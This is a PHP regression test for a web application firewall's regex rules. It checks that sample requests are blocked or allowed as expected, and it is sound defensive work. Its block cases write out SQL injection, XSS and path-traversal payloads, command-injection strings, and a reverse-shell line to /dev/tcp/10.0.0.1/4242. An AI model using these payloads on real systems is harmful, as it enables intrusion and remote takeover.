# LiteWAF 规则正误样本回归测试（PHP PCRE 与 OpenResty ngx.re 同源）
# 用法：php LiteWAF/tests/litewaf_regex_test.php

<?php
$fail = 0;
$luaFile = __DIR__ . '/../lua/litewaf.lua';
$lua = file_get_contents($luaFile);
if (!preg_match('/-- RULES-BEGIN(.*?)-- RULES-END/s', $lua, $m)) {
    exit("未找到 RULES-BEGIN/END 标记\n");
}
// 支持可选等号长括号 [[...]] / [==[...]==]（规则含 ]] 字符时按 README 规范
// 使用等号长括号书写，如 uname 的字符类规则），否则这类规则会被静默漏解析、
// 脱离回归测试
if (!preg_match_all('/\{\s*"([a-z]+)",\s*\[(=*)\[(.*?)\]\2\]\s*\}/s', $m[1], $raw, PREG_SET_ORDER)) {
    exit("未解析到任何规则\n");
}
$rules = [];
foreach ($raw as $r) {
    // 组 1 = 类目，组 2 = 长括号等号，组 3 = 正则体
    $rules[] = ['cat' => $r[1], 're' => $r[3]];
}
echo '已加载规则数：' . count($rules) . "\n";

// 与 litewaf.lua 一致的匹配语义：按规则表顺序，命中即停；
// URI 请求先查原始 request_uri（编码形态），未命中再查完整解码形态（与生产双 subject 一致）
function first_hit(array $rules, string $subject): ?string {
    foreach ($rules as $rule) {
        if (@preg_match('~' . $rule['re'] . '~i', $subject)) {
            return $rule['cat'];
        }
    }
    return null;
}

function check(array $rules, string $subject): ?string {
    $hit = first_hit($rules, $subject);
    if ($hit === null && str_starts_with($subject, '/')) {
        $decoded = urldecode($subject);
        if ($decoded !== $subject) {
            $hit = first_hit($rules, $decoded);
        }
    }
    return $hit;
}

// [subject, 期望类目或 null]
$cases = [
    // ── 应拦截 ──
    ['/v1/log?id=1 UNION SELECT username FROM users', 'sqli'],
    ["/?id=1' OR '1'='1", 'sqli'],
    ['/?id=1%27%20OR%20%271%27%3D%271', 'sqli'],
    ['/?q=1 and 1=2', 'sqli'],
    ['/?t=1;WAITFOR DELAY "0:0:5"--', 'sqli'],
    ['/?x=<script>alert(1)</script>', 'xss'],
    ['/?redirect=javascript:alert(1)', 'xss'],
    ['/?img=x" onerror=alert(1)', 'xss'],
    ['/?back=javascript:void(document.cookie)', 'xss'],
    ['/download?file=../../../../etc/passwd', 'traversal'],
    ['/?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'traversal'],
    ['/?p=..\\..\\windows', 'traversal'],
    ['/.env', 'probe'],
    ['/.git/config', 'probe'],
    ['/wp-login.php', 'probe'],
    ['/phpmyadmin/index.php', 'probe'],
    ['/db.backup.sql', 'probe'],
    ['/index.php', 'probe'],
    ['/actuator/health', 'probe'],
    ['/cgi-bin/test.cgi', 'probe'],
    ['/id_rsa', 'probe'],
    ['sqlmap/1.7.11#stable', 'probe'],
    ['Nikto/2.5.0', 'probe'],
    ['gobuster/3.6', 'probe'],
    // ── 新增规则样本（v1.1.0：rce 类目 + 扩充探测/扫描器）──
    ['/?cmd=1;cat+/etc/passwd', 'traversal'],
    ['/download?file=/proc/self/environ', 'rce'],
    ['/?exec=%24%28whoami%29', 'rce'],
    ['/?c=%60id%60', 'rce'],
    ['/?c=1|bash -i >& /dev/tcp/10.0.0.1/4242', 'rce'],
    ['/?cmd=uname -a', 'rce'],
    ['/?load=system%28id%29', 'rce'],
    ['/?u=data:text/html;base64,AAAA', 'xss'],
    ['/?v=@@version', 'sqli'],
    ['/?s=extractvalue(1,concat(0x7e,user()))', 'sqli'],
    ['/?p=1;sleep(5)', 'sqli'],
    ['/?q=1 and updatexml(1,0x7e,1)', 'sqli'],
    ['/nacos/', 'probe'],
    ['/druid/index.html', 'probe'],
    ['/jenkins/login', 'probe'],
    ['/solr/', 'probe'],
    ['/server-status', 'probe'],
    ['/wp-json/wp/v2/users', 'probe'],
    ['/.htpasswd', 'probe'],
    ['xray/1.2.4', 'probe'],
    ['dirsearch/3.1', 'probe'],
    ['feroxbuster/2.10', 'probe'],
    ['whatweb/0.5.5', 'probe'],
    // ── 不应拦截（正常业务与常见 UA）──
    ['/v1/log', null],
    ['/v1/raw/Ks7dQ2a', null],
    ['/?p=2&n=50', null],
    ['/v1/raw/abc123?start=10&end=20', null],
    ['/v1/insights?range=24h', null],
    ['/v1/limits', null],
    ['/?content=[12:34:56] [INFO]: Starting server on 1.2.3.4', null],
    ['/v1/log?token=abc123def456', null],
    ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0', null],
    ['LogShare-CLI/1.0 (+https://logshare.cn)', null],
    ['curl/8.5.0', null],
    ['LogShare-MC-Plugin/2.1', null],
    ['/.well-known/acme-challenge/token123', null],
    ['/v1/log?message=SUCCESS OR FAILURE', null],
    // ── 新增规则的反例（防误报）──
    ['/?q=evaluate the plan', null],
    ['/?msg=status; done id=5', null],
    ['/?n=The-Console.html', null],
    ['/solrway-backup', null],
    ['/?note=reindex druidx', null],
    ['/?title=manager/htmlbook', null],
    ['Go-http-client/2.0', null],
    ['LogShare-Bot/1.0 (+https://logshare.cn)', null],
    // python-httpx 是常用 HTTP 客户端的默认 UA，不得被 httpx 规则误伤
    ['python-httpx/0.27.2', null],
    // S1 回归：/security 前缀变体必须仍被规则覆盖（WAF 侧不得跳过特征检查）
    ['/security/../../etc/passwd', 'traversal'],
    ['/securityXYZ?q=<script>alert(1)</script>', 'xss'],
    ['/security/stats?id=1%20UNION%20SELECT%20a', 'sqli'],
    // 统计页自身两个精确 URI 不应被规则误伤
    ['/security', null],
    ['/security/stats', null],
];

foreach ($cases as [$subject, $expected]) {
    $got = check($rules, $subject);
    if ($got !== $expected) {
        $fail++;
        echo "FAIL: {$subject}\n  期望: " . var_export($expected, true) . "  实际: " . var_export($got, true) . "\n";
    }
}

echo $fail === 0 ? "全部通过（" . count($cases) . " 个样本）\n" : "{$fail} 个样本失败\n";
exit($fail === 0 ? 0 : 1);
